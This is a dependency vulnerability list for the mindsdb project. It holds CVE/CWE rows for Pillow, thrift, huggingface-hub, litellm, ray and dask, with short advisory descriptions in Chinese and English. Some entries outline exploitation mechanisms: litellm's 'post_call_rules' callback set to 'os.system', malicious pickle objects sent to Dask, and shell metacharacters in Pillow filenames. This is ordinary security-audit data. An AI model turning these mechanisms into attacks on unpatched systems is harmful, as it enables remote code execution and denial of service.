mindsdb_mindsdb,pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
mindsdb_mindsdb,pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
mindsdb_mindsdb,pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
mindsdb_mindsdb,pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
mindsdb_mindsdb,pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
mindsdb_mindsdb,pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
mindsdb_mindsdb,pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
mindsdb_mindsdb,pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
mindsdb_mindsdb,pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
mindsdb_mindsdb,pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
mindsdb_mindsdb,thrift,,True,,CWE-189,2020-04-03,"## Overview
[thrift](https://pypi.org/project/thrift/) is a Python bindings package for Apache Thrift.

Affected versions of this package are vulnerable to Denial of Service (DoS). Within `TBinaryProtocol.readString`, if the string field's size is greater than the number of bytes remaining in the byte array to deserialize, 1thrift` will happily allocate a byte array of that size in `readStringBody`, filling the heap. This could result in denial of service conditions.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `thrift` to version 0.9.0 or higher.
## References
- [Apache Jira](https://issues.apache.org/jira/browse/THRIFT-2272)
",2,2
mindsdb_mindsdb,thrift,,True,,CWE-20,2020-04-01,"## Overview
[thrift](https://pypi.org/project/thrift/) is a Python bindings package for Apache Thrift.

Affected versions of this package are vulnerable to Insufficient Validation. Multiple SSL vulnerabilities exists within `thrift` which includes:

* It is possible to abuse to embedded OpenSSL library within `thrift` to conduct denial of service attacks by abusing `TSSLSocket` during `close()`
* The SSL library used by default allows for insecure SSLv3 negotiation
## Remediation
Upgrade `thrift` to version 0.9.3 or higher.
## References
- [Apache Jira 1](https://issues.apache.org/jira/browse/THRIFT-3061)
- [Apache Jira 2](https://issues.apache.org/jira/browse/THRIFT-3164)
",3,0
mindsdb_mindsdb,huggingface-hub,,True,,CWE-284,2023-05-22,"## Overview
[huggingface-hub](https://pypi.org/project/huggingface-hub) is a Client library to download and publish models, datasets and other repos on the huggingface.co hub

Affected versions of this package are vulnerable to Access Control Bypass such that a malicious repo on the Hub can overwrite any file on the disk when using `hf_hub_download/snapshot_download`.
## Remediation
Upgrade `huggingface-hub` to version 0.13.4 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/huggingface_hub/commit/0848f80fd4ed0122485105fe2b0111165ecaff3b)
- [GitHub PR](https://github.com/huggingface/huggingface_hub/pull/1429)
- [GitHub Release](https://github.com/huggingface/huggingface_hub/releases/tag/v0.13.4)
",3,2
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2025-45809,CWE-89,2025-07-03,"BerriAI LiteLLM是BerriAI开源的一个调用大语言模型的Python库。
BerriAI LiteLLM v1.65.4版本存在安全漏洞，该漏洞源于/key/block端点存在SQL注入漏洞。",3,0
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2024-8984,CWE-770,,LiteLLM 是 Berri AI 开源的一个应用程序，它允许用户使用 OpenAI 格式调用所有 LLM API。LiteLLM v1.44.5 版本存在拒绝服务漏洞，该漏洞来源于未正确处理 HTTP 请求中的多部分边界。攻击者通过在多部分边界末尾附加字符（例如短横线 -），导致服务器持续处理每个字符，进而消耗大量资源并使服务不可用。此漏洞是完全未经身份验证的，不需要任何用户交互，影响所有使用此服务的用户。,2,1
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2025-0330,CWE-1230,,在 berriai/litellm 版本 v1.52.1 中，proxy_server.py 文件存在一个漏洞：当解析团队设置时发生错误时，会导致 Langfuse API 密钥泄露。该漏洞会暴露包含 langfuse_secret 和 langfuse_public_key 等敏感信息，这些密钥可提供对存储所有请求的 Langfuse 项目的完全访问权限。,2,1
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2024-6825,CWE-94,,LiteLLM 是由 Berri AI 开源的应用程序，支持使用 OpenAI 格式调用所有 LLM API。LiteLLM 版本 1.40.12 存在远程代码执行漏洞，该漏洞源于对 'post_call_rules' 配置处理的不当。该配置允许添加回调函数，所提供的值在最后一个 '.' 字符处分割，最后部分被视为函数名，其余部分被附加 '.py' 后缀并导入。这使得攻击者能够将系统方法（例如 'os.system'）设置为回调，从而在处理聊天响应时执行任意命令。,2,1
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2025-45809,CWE-89,2025-07-03,"BerriAI LiteLLM是BerriAI开源的一个调用大语言模型的Python库。
BerriAI LiteLLM v1.65.4版本存在安全漏洞，该漏洞源于/key/block端点存在SQL注入漏洞。",3,0
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2024-8984,CWE-770,,LiteLLM 是 Berri AI 开源的一个应用程序，它允许用户使用 OpenAI 格式调用所有 LLM API。LiteLLM v1.44.5 版本存在拒绝服务漏洞，该漏洞来源于未正确处理 HTTP 请求中的多部分边界。攻击者通过在多部分边界末尾附加字符（例如短横线 -），导致服务器持续处理每个字符，进而消耗大量资源并使服务不可用。此漏洞是完全未经身份验证的，不需要任何用户交互，影响所有使用此服务的用户。,2,1
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2025-0330,CWE-1230,,在 berriai/litellm 版本 v1.52.1 中，proxy_server.py 文件存在一个漏洞：当解析团队设置时发生错误时，会导致 Langfuse API 密钥泄露。该漏洞会暴露包含 langfuse_secret 和 langfuse_public_key 等敏感信息，这些密钥可提供对存储所有请求的 Langfuse 项目的完全访问权限。,2,1
mindsdb_mindsdb,litellm,1.63.14,True,CVE-2024-6825,CWE-94,,LiteLLM 是由 Berri AI 开源的应用程序，支持使用 OpenAI 格式调用所有 LLM API。LiteLLM 版本 1.40.12 存在远程代码执行漏洞，该漏洞源于对 'post_call_rules' 配置处理的不当。该配置允许添加回调函数，所提供的值在最后一个 '.' 字符处分割，最后部分被视为函数名，其余部分被附加 '.py' 后缀并导入。这使得攻击者能够将系统方法（例如 'os.system'）设置为回调，从而在处理聊天响应时执行任意命令。,2,1
mindsdb_mindsdb,ray,2.43.0,True,CVE-2023-48022,CWE-918,2023-11-28,<p>CVE-2023-48022 是一个严重影响 Anyscale Ray AI 框架（特别是版本2.6.3和2.8.0）的漏洞。此漏洞关联到作业提交 API，使远程攻击者无需进行身份验证即可执行任意代码。该漏洞对暴露在互联网环境中的Ray的作业API影响重大，会导致未经授权的作业执行甚至完全控制受影响的服务器。</p>,1,1
mindsdb_mindsdb,ray,2.43.0,True,CVE-2024-36459,CWE-93,2024-12-11,<p>Ray 是一个开源的分布式计算框架，专为扩展 AI 和机器学习（ML）应用而设计。Ray 提供一个统一的计算框架，使开发人员能够管理、执行和优化各类 AI 工作负载中的计算需求。然而，该框架存在一个CRLF（回车换行）注入漏洞，此漏洞导致攻击者可以通过在HTTP响应头中注入意外的CRLF字符进行攻击，可能导致HTTP响应分割，从而被利用进行跨站脚本（XSS）攻击、缓存投毒和网络钓鱼等攻击。</p>,2,1
mindsdb_mindsdb,dask,,True,CVE-2024-10096,CWE-77,,Dask 是一个开源的并行计算库，具有任务调度功能。Dask的2024.8.2及之前版本存在命令注入漏洞，漏洞的根本原因在于pickle序列化方式的不当使用，允许攻击者构造恶意对象。这些恶意对象可以在客户端进行序列化后发送到服务器进行反序列化，从而导致远程命令执行，攻击者可能因此获得对Dask服务器的完全控制。,1,1
mindsdb_mindsdb,dask,,True,,,,<p>Dask 是一个用于并行计算和处理大规模数据的 Python 库，能够在分布式环境中高效处理数据。当用户使用 `dask.array.from_npy_stack` 函数加载包含恶意 `info` 文件的 dask 数组文件夹时，可能会触发命令注入漏洞。该函数在加载文件时使用 `pickle.load` 方法，如果加载了经过恶意构造的 `info` 文件，攻击者可以通过命令注入执行任意命令。</p>,2,1
